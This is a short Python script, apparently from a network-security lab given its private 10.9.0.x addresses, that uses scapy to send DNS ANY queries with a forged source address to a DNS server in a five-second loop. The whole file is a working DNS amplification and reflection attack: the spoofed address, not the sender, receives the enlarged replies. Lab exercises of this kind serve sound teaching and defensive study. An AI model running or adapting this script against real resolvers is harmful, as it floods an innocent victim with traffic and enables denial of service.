from scapy.all import *
import time

# Configuration
target_ip = "10.9.0.53"     # DNS server IP
spoofed_ip = "10.9.0.5"     # Spoofed client IP (appears to be the source)
dns_query = "google.com"  # Domain to query

# Construct DNS query packet (ANY type)
dns_pkt = IP(src=spoofed_ip, dst=target_ip) / \
          UDP(sport=RandShort(), dport=53) / \
          DNS(rd=1, qd=DNSQR(qname=dns_query, qtype=255))

# Send for 5 seconds
start = time.time()
while time.time() - start < 5:
    send(dns_pkt, verbose=0)
